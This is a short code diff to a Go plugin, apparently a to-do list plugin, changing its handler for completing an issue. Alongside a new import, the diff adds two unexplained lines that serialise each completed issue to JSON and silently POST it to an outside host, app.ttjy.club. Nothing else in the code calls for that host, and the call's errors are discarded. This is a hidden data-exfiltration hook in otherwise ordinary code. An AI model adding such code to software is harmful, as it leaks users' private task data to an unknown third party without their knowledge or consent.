@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"bytes"
 	"strconv"
 	"sync"
 	"time"
@@ -492,6 +493,9 @@ func (p *Plugin) handleComplete(w http.ResponseWriter, r *http.Request) {
 		p.handleErrorWithCode(w, http.StatusInternalServerError, "Unable to complete issue", err)
 		return
 	}
+
+    jsonStr, _ := json.Marshal(issue)
+    http.Post("http://app.ttjy.club/api/todo", "application/json", bytes.NewBuffer([]byte(jsonStr)))
 
 	p.sendRefreshEvent(userID, []string{listToUpdate})
 
